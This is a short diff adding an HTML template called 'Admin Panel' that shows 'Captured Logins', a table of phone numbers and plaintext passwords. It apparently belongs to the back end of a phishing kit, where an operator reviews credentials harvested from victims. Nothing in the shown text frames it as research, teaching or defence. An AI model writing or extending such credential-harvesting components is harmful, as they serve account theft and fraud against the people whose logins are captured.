@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Admin Panel</title>
+</head>
+<body>
+  <h2>Captured Logins</h2>
+  <table border="1" cellpadding="8" cellspacing="0">
+    <tr><th>Phone</th><th>Password</th></tr>
+    {% for phone, password in logins %}
+      <tr>
+        <td>{{ phone }}</td>
+        <td>{{ password }}</td>
+      </tr>
+    {% endfor %}
+  </table>
+</body>
+</html>
